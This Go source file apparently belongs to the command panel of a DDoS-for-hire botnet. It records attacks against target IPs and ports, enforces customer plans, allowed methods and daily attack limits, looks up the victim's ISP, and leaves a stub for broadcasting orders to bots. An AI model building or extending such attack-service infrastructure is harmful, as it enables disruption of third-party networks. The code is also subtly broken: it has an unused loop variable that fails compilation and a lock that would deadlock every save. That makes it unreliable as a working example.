package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

type Attack struct {
	ID        int       `json:"id"`
	Target    string    `json:"target"`
	Port      int       `json:"port"`
	Method    string    `json:"method"`
	Duration  int       `json:"duration"`
	Threads   int       `json:"threads"`
	User      string    `json:"user"`
	Started   time.Time `json:"started"`
	Expires   time.Time `json:"expires"`
	Remaining int       `json:"remaining"`
	Status    string    `json:"status"`
	ISP       string    `json:"isp"`
}

type AttackManager struct {
	Attacks   map[int]*Attack
	Mutex     sync.RWMutex
	Filename  string
	IDCounter int
}

var attackManager = &AttackManager{
	Attacks:   make(map[int]*Attack),
	Filename:  "data/attacks.json",
	IDCounter: 0,
}

func (am *AttackManager) Load() error {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	file, err := os.ReadFile(am.Filename)
	if err != nil {
		if os.IsNotExist(err) {
			am.saveToFile()
			return nil
		}
		return err
	}

	var attacks []*Attack
	if err := json.Unmarshal(file, &attacks); err != nil {
		return err
	}

	am.Attacks = make(map[int]*Attack)
	maxID := 0
	for _, attack := range attacks {
		am.Attacks[attack.ID] = attack
		if attack.ID > maxID {
			maxID = attack.ID
		}
	}
	am.IDCounter = maxID + 1

	return nil
}

func (am *AttackManager) saveToFile() error {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	var attacks []*Attack
	for _, attack := range am.Attacks {
		attacks = append(attacks, attack)
	}

	data, err := json.MarshalIndent(attacks, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(am.Filename, data, 0644)
}

func (am *AttackManager) Add(target string, port int, method string, duration int, threads int, user string, isp string) int {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	id := am.IDCounter
	am.IDCounter++

	now := time.Now()
	attack := &Attack{
		ID:        id,
		Target:    target,
		Port:      port,
		Method:    method,
		Duration:  duration,
		Threads:   threads,
		User:      user,
		Started:   now,
		Expires:   now.Add(time.Duration(duration) * time.Second),
		Remaining: duration,
		Status:    "running",
		ISP:       isp,
	}

	am.Attacks[id] = attack
	am.saveToFile()

	go am.countdownTimer(id)

	return id
}

func (am *AttackManager) countdownTimer(id int) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		am.Mutex.Lock()
		attack, exists := am.Attacks[id]
		if !exists {
			am.Mutex.Unlock()
			return
		}

		if attack.Status == "stopped" || attack.Status == "finished" {
			am.Mutex.Unlock()
			return
		}

		remaining := int(time.Until(attack.Expires).Seconds())
		if remaining <= 0 {
			attack.Status = "finished"
			attack.Remaining = 0
			am.saveToFile()
			am.Mutex.Unlock()
			return
		}

		attack.Remaining = remaining
		am.saveToFile()
		am.Mutex.Unlock()
	}
}

func (am *AttackManager) Get(id int) *Attack {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	return am.Attacks[id]
}

func (am *AttackManager) GetAll() []*Attack {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	var attacks []*Attack
	for _, attack := range am.Attacks {
		attacks = append(attacks, attack)
	}
	return attacks
}

func (am *AttackManager) GetByUser(username string) []*Attack {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	var attacks []*Attack
	for _, attack := range am.Attacks {
		if attack.User == username {
			attacks = append(attacks, attack)
		}
	}
	return attacks
}

func (am *AttackManager) GetRunning() []*Attack {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	var attacks []*Attack
	for _, attack := range am.Attacks {
		if attack.Status == "running" {
			attacks = append(attacks, attack)
		}
	}
	return attacks
}

func (am *AttackManager) Stop(id int) bool {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	attack, exists := am.Attacks[id]
	if !exists {
		return false
	}

	if attack.Status != "running" {
		return false
	}

	attack.Status = "stopped"
	am.saveToFile()
	return true
}

func (am *AttackManager) StopAll(user string) int {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	count := 0
	for id, attack := range am.Attacks {
		if attack.User == user && attack.Status == "running" {
			attack.Status = "stopped"
			count++
		}
	}
	am.saveToFile()
	return count
}

func (am *AttackManager) Clean() {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	now := time.Now()
	for id, attack := range am.Attacks {
		if attack.Status == "finished" && now.Sub(attack.Expires) > time.Hour {
			delete(am.Attacks, id)
		}
		if attack.Status == "stopped" && now.Sub(attack.Started) > time.Hour {
			delete(am.Attacks, id)
		}
	}
	am.saveToFile()
}

func (am *AttackManager) StartCleaner() {
	ticker := time.NewTicker(10 * time.Minute)
	go func() {
		for range ticker.C {
			am.Clean()
		}
	}()
}

func (am *AttackManager) GetCount() int {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	return len(am.Attacks)
}

func getISP(ip string) string {
	// Try to get ISP from ip-api.com
	/*
	import "net/http"
	import "io"
	import "encoding/json"
	
	resp, err := http.Get("http://ip-api.com/json/" + ip + "?fields=isp")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "Unknown"
	}
	var result map[string]interface{}
	json.Unmarshal(body, &result)
	if isp, ok := result["isp"].(string); ok {
		return isp
	}
	*/
	return "Unknown"
}

func startAttack(conn net.Conn, method, target, port, duration, username string) {
	// Validate method
	if !isMethodAllowed(username, method) {
		showError(conn, "Method not allowed for your plan")
		return
	}

	// Validate port
	portNum := 0
	for _, c := range port {
		if c < '0' || c > '9' {
			showError(conn, "Invalid port")
			return
		}
	}
	fmt.Sscanf(port, "%d", &portNum)
	if portNum < 1 || portNum > 65535 {
		showError(conn, "Port must be 1-65535")
		return
	}

	// Validate duration
	durationNum := 0
	for _, c := range duration {
		if c < '0' || c > '9' {
			showError(conn, "Invalid duration")
			return
		}
	}
	fmt.Sscanf(duration, "%d", &durationNum)
	if durationNum < 1 {
		showError(conn, "Duration must be at least 1 second")
		return
	}

	// Check max duration
	maxDur := getMaxDuration(username)
	if durationNum > maxDur {
		showError(conn, fmt.Sprintf("Max duration for your plan is %ds", maxDur))
		return
	}

	// Validate IP
	if !validateIP(target) {
		showError(conn, "Invalid IP address")
		return
	}

	// Increment attack count
	if !incrementAttacks(username) {
		showError(conn, "Daily attack limit reached")
		return
	}

	// Get ISP
	isp := getISP(target)

	// Add attack
	attackManager.Load()
	id := attackManager.Add(target, portNum, method, durationNum, 100, username, isp)

	// Show details
	showAttackDetails(conn, method, target, port, duration, username, isp)
	sendLine(conn, " Attack ID: "+fmt.Sprintf("%d", id))
	sendLine(conn, "")

	// TODO: Broadcast to bots
}

func stopAttack(conn net.Conn, id int, username string) {
	attackManager.Load()
	attack := attackManager.Get(id)

	if attack == nil {
		showError(conn, fmt.Sprintf("Attack ID %d not found", id))
		return
	}

	if attack.User != username && !isAdmin(username) {
		showError(conn, "You can only stop your own attacks")
		return
	}

	if attack.Status != "running" {
		showError(conn, fmt.Sprintf("Attack ID %d is not running", id))
		return
	}

	if attackManager.Stop(id) {
		showSuccess(conn, fmt.Sprintf("Attack ID %d stopped", id))
	} else {
		showError(conn, fmt.Sprintf("Failed to stop attack ID %d", id))
	}
}

func stopAllAttacks(conn net.Conn, username string) {
	attackManager.Load()
	count := attackManager.StopAll(username)

	if count > 0 {
		showSuccess(conn, fmt.Sprintf("Stopped %d attacks", count))
	} else {
		showInfo(conn, "No running attacks to stop")
	}
}

var attacks = make(map[int]Attack)
var attackIDCounter = 0
var attacksMutex sync.Mutex